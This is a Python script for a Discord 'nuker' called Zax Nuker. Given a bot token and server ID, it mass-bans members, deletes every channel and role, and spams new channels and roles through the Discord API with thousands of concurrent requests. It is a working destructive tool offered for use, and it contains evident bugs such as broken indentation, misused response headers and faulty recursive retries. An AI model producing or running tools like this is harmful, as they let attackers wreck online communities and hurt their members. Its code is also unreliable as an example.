import aiosonic, asyncio, datetime
from pystyle import Colors, Write, System
from tasksio import TaskPool
from aiosonic import Timeouts, TCPConnector

class Zax:
  def __init__(self, token: str, guild: int):
    self.token = token
    self.guild = guild
    self.roles = []
    self.channels = []
    self.members = []
    #colors-----------------------------------
    self.banner_color = Colors.purple_to_blue
    self.choice_color = Colors.blue_to_purple
    self.done_color = Colors.cyan_to_blue
    self.error_color = Colors.red_to_purple
    self._logo = """
    
     ________  ________     ___    ___ 
    |\_____  \|\   __  \   |\  \  /  /|
     \|___/  /\ \  \|\  \  \ \  \/  / /
         /  / /\ \   __  \  \ \    / / 
        /  /_/__\ \  \ \  \  /     \/  
       |\________\ \__\ \__\/  /\   \  
        \|_______|\|__|\|__/__/ /\ __\ 
                           |__|/ \|__| 
                                       
                                       
    \n"""
    self.timeOuts = Timeouts(sock_connect=999, sock_read=999, pool_acquire=999, request_timeout=999)
    self.conn = TCPConnector(pool_size=50, timeouts=self.timeOuts)
    
    
    
  async def ban(self, session, member):
    response = await session.put(f"https://discord.com/api/v10/guilds/{self.guild}/bans/{member}", headers={"Authorization": f"Bot {self.token}"})
    if response.status_code in (200, 201, 204):
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Successfully Eliminated {member}\n', color=self.done_color, interval=0)
    elif response.status_code == 429:
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Ratelimited, Retrying In {response.headers("Retry-After")} Seconds\n', color=self.error_color, interval=0)
      await asyncio.sleep(response.headers("Retry-After"))
      await self.ban(self, session, member)
  
  async def delc(self, session, channel):
    response = await session.delete(f"https://discord.com/api/v10/channels/{channel}", headers={"Authorization": f"Bot {self.token}"})
    if response.status_code in (200, 201, 204):
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Successfully Deleted Channel {channel}\n', color=self.done_color, interval=0)
    elif response.status_code == 429:
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Ratelimited, Retrying In {response.headers("Retry-After")} Seconds\n', color=self.error_color, interval=0)
      await asyncio.sleep(response.headers("Retry-After"))
      await self.delc(self, session, channel)
  
  async def delr(self, session, role):
    response = await session.delete(f"https://discord.com/api/v10/roles/{role}", headers={"Authorization": f"Bot {self.token}"})
    if response.status_code in (200, 201, 204):
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Successfully Deleted Role {role}\n', color=self.done_color, interval=0)
    elif response.status_code == 429:
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Ratelimited, Retrying In {response.headers("Retry-After")} Seconds\n', color=self.error_color, interval=0)
      await asyncio.sleep(response.headers("Retry-After"))
      await self.delr(self, session, role)
  
  async def createc(self, session, name):
    response = await session.post(f"https://discord.com/api/v10/guilds/{self.guild}/channels", headers={"Authorization": f"Bot {self.token}"}, json={"name": name, "type": 0})
    if response.status_code in (200, 201, 204):
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Successfully Created Channel #{name}\n', color=self.done_color, interval=0)
    elif response.status_code == 429:
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Ratelimited, Retrying In {response.headers("Retry-After")} Seconds\n', color=self.error_color, interval=0)
      await asyncio.sleep(response.headers("Retry-After"))
      await self.createc(self, session, name)
  
  async def creater(self, session, name):
    response = await session.post(f"https://discord.com/api/v10/guilds/{self.guild}/roles", headers={"Authorization": f"Bot {self.token}"}, json={"name": name})
    if response.status_code in (200, 201, 204):
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Successfully Created Role {name}\n', color=self.done_color, interval=0)
    elif response.status_code == 429:
      Write.Print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}] Ratelimited, Retrying In {response.headers("Retry-After")} Seconds\n', color=self.error_color, interval=0)
      await asyncio.sleep(response.headers("Retry-After"))
      await self.creater(self, session, name)
      
  
  
  async def load(self):
     self.members.clear()
     self.channels.clear()
     self.roles.clear()
    with open("core/members.txt", "r") as file:
      for line in file.readlines():
        self.members.append(int(line))
    with open("core/channels.txt", "r") as file:
      for line in file.readlines():
        self.channels.append(int(line))
    with open("core/roles.txt", "r") as file:
      for line in file.readlines():
        self.roles.append(int(line))
    
  async def logo(self):

    System.Clear()
    System.Title("Zax Nuker ~ Vixer 99")
    Write.Print(self._logo, color=self.banner_color, interval=0.00)
    Write.Print("[1] Massban\n[2] Delete Channels\n[3] Delete Roles\n[4] Create Channels\n[5] Create Roles \n", color=self.choice_color, interval=0)
    global choice
    choice = int(input("Choice => "))
  
  async def main(self):
    await self.load()
    await self.logo()
    
    if choice == 1:
      async with aiosonic.HTTPClient(connector=self.conn) as client:
        async with TaskPool(4_000) as pool:
          for mem in self.members:
            await pool.put(self.ban(client, mem))
        await self.main()
        
    elif choice == 2:
      async with aiosonic.HTTPClient(connector=self.conn) as client:
        async with TaskPool(4_000) as pool:
          for chan in self.channels:
            await pool.put(self.delc(client, chan))
        await self.main()
        
    elif choice == 3:
      async with aiosonic.HTTPClient(connector=self.conn) as client:
        async with TaskPool(4_000) as pool:
          for role in self.roles:
            await pool.put(self.delr(client, role))
        await self.main()
        
    elif choice == 4:
      async with aiosonic.HTTPClient(connector=self.conn) as client:
        async with TaskPool(4_000) as pool:
          name = input("Channel Name => ")
          amount = input("Amount => ")
          for i in range(int(amount)):
            await pool.put(self.createc(client, name))
        await self.main()
        
    elif choice == 5:
      async with aiosonic.HTTPClient(connector=self.conn) as client:
        async with TaskPool(4_000) as pool:
          name = input("Role Name => ")
          amount = input("Amount => ")
          for i in range(int(amount)):
            await pool.put(self.creater(client, name))
        await self.main()
     
    else:
      await self.main()
  
  

if __name__ == '__main__':
  TKN = input("Token => ")
  SRV = input("Server Id => ")
  
  zax = Zax(token=TKN, guild=SRV)
  asyncio.get_event_loop().run_until_complete(zax.main())
